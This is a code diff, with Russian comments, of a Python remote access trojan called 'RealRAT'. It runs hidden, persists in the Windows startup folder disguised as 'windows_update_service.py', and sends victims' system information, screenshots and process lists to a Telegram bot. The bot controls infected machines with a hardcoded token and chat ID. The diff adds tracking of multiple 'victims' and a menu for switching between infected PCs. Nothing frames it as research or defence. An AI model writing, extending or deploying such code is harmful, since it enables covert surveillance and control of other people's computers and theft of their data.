@@ -6,6 +6,7 @@ import time
 import shutil
 import socket
 import sys
+import json
 
 try:
     from PIL import ImageGrab
@@ -20,12 +21,22 @@ except ImportError:
 BOT_TOKEN = "8317387634:AAHexPFi5rjtIZMDztq2oOnPp9z8Chl4sn0"
 CHAT_ID = "-1003442349627"
 
+# Храним информацию о всех жертвах
+victims = {}
+
 class RealRAT:
     def __init__(self):
         self.bot_token = BOT_TOKEN
         self.chat_id = CHAT_ID
         self.victim_id = socket.gethostname()
         self.last_update_id = 0
+        
+        # Регистрируем жертву
+        victims[self.victim_id] = {
+            'username': os.getlogin(),
+            'online': True,
+            'last_seen': time.time()
+        }
         
     def hide_console(self):
         try:
@@ -74,28 +85,61 @@ class RealRAT:
         except:
             pass
 
-    def send_keyboard(self):
-        """Отправляем клавиатуру с кнопками"""
+    def send_main_keyboard(self):
+        """Основная клавиатура управления"""
         try:
             url = f"https://api.telegram.org/bot{self.bot_token}/sendMessage"
             keyboard = {
                 'keyboard': [
                     [{'text': '📸 Скриншот'}, {'text': '💻 Информация'}],
                     [{'text': '🌐 IP адрес'}, {'text': '📊 Процессы'}],
-                    [{'text': '🔄 Перезагрузить'}, {'text': '🗑️ Удалить RAT'}]
+                    [{'text': '🔄 Перезагрузить'}, {'text': '🗑️ Удалить RAT'}],
+                    [{'text': '🖥️ Сменить ПК'}]  # Новая кнопка для смены ПК
                 ],
                 'resize_keyboard': True,
                 'one_time_keyboard': False
             }
             params = {
                 'chat_id': self.chat_id,
-                'text': f'🎯 Управление жертвой: {self.victim_id}\nВыберите действие:',
+                'text': f'🎯 Управление: {self.victim_id}\nПользователь: {os.getlogin()}\nВыберите действие:',
                 'reply_markup': keyboard
             }
-            response = requests.post(url, json=params, timeout=10)
-            print("Клавиатура отправлена") if response.status_code == 200 else print("Ошибка клавиатуры")
-        except Exception as e:
-            print(f"Ошибка отправки клавиатуры: {e}")
+            requests.post(url, json=params, timeout=10)
+        except:
+            pass
+
+    def send_pc_selection_keyboard(self):
+        """Клавиатура выбора ПК"""
+        try:
+            # Обновляем статус онлайн
+            victims[self.victim_id]['online'] = True
+            victims[self.victim_id]['last_seen'] = time.time()
+            
+            # Создаем кнопки для каждого ПК
+            pc_buttons = []
+            for pc_id, pc_info in victims.items():
+                status = "🟢" if pc_info['online'] else "🔴"
+                button_text = f"{status} {pc_id}"
+                pc_buttons.append([{'text': button_text}])
+            
+            # Добавляем кнопку назад
+            pc_buttons.append([{'text': '⬅️ Назад'}])
+            
+            keyboard = {
+                'keyboard': pc_buttons,
+                'resize_keyboard': True,
+                'one_time_keyboard': False
+            }
+            
+            url = f"https://api.telegram.org/bot{self.bot_token}/sendMessage"
+            params = {
+                'chat_id': self.chat_id,
+                'text': '🖥️ Выберите компьютер для управления:',
+                'reply_markup': keyboard
+            }
+            requests.post(url, json=params, timeout=10)
+        except:
+            pass
 
     def collect_system_info(self):
         try:
@@ -142,6 +186,11 @@ class RealRAT:
                 rat_path = os.path.join(startup_dir, 'windows_update_service.py')
                 if os.path.exists(rat_path):
                     os.remove(rat_path)
+            
+            # Удаляем из списка жертв
+            if self.victim_id in victims:
+                del victims[self.victim_id]
+                
             return True
         except:
             return False
@@ -184,7 +233,7 @@ class RealRAT:
             return f"❌ Ошибка: {str(e)}"
 
     def check_commands(self):
-        """Проверяем только НОВЫЕ команды от бота"""
+        """Проверяем команды от бота"""
         try:
             url = f"https://api.telegram.org/bot{self.bot_token}/getUpdates"
             params = {'offset': self.last_update_id + 1, 'timeout': 10}
@@ -196,26 +245,37 @@ class RealRAT:
                     for update in data['result']:
                         update_id = update['update_id']
                         
-                        # Обновляем ID последнего сообщения
                         if update_id > self.last_update_id:
                             self.last_update_id = update_id
                         
-                        # Обрабатываем только если есть сообщение с текстом
                         if 'message' in update and 'text' in update['message']:
                             message_text = update['message']['text']
                             
-                            # Обрабатываем команду /start или /menu
-                            if message_text in ['/start', '/menu', 'меню', 'кнопки']:
-                                self.send_keyboard()
+                            # Команда смены ПК
+                            if message_text in ['/change', '🖥️ Сменить ПК']:
+                                self.send_pc_selection_keyboard()
                                 continue
                             
-                            # Обрабатываем команды с кнопок
+                            # Кнопка Назад
+                            if message_text == '⬅️ Назад':
+                                self.send_main_keyboard()
+                                continue
+                            
+                            # Выбор конкретного ПК (начинается с 🟢 или 🔴)
+                            if message_text.startswith('🟢 ') or message_text.startswith('🔴 '):
+                                selected_pc = message_text[2:]  # Убираем эмодзи
+                                if selected_pc in victims:
+                                    # Пока просто уведомляем о выборе
+                                    self.send_to_telegram(f"🎯 Выбран компьютер: {selected_pc}\nУправление через основное меню")
+                                    self.send_main_keyboard()
+                                continue
+                            
+                            # Основные команды управления
                             if message_text in ['📸 Скриншот', '💻 Информация', '🌐 IP адрес', '📊 Процессы', 
                                               '🔄 Перезагрузить', '🗑️ Удалить RAT']:
                                 result = self.execute_command(message_text)
                                 self.send_to_telegram(f"💻 {self.victim_id}:\n{result}")
                                 
-                                # Если удаляем RAT - завершаем работу
                                 if message_text == '🗑️ Удалить RAT':
                                     time.sleep(2)
                                     sys.exit(0)
@@ -227,14 +287,14 @@ class RealRAT:
         self.hide_console()
         self.setup_persistence()
         
-        # Сразу отправляем клавиатуру при запуске
+        # Отправляем уведомление о подключении
         time.sleep(5)
-        self.send_keyboard()
-        
-        # Отправляем информацию о системе
-        time.sleep(3)
         system_info = self.collect_system_info()
         self.send_to_telegram(system_info)
+        
+        # Отправляем основную клавиатуру
+        time.sleep(2)
+        self.send_main_keyboard()
         
         # Основной цикл
         while True:
@@ -242,7 +302,6 @@ class RealRAT:
                 self.check_commands()
                 time.sleep(3)
             except Exception as e:
-                print(f"Ошибка главного цикла: {e}")
                 time.sleep(10)
 
 if __name__ == '__main__':
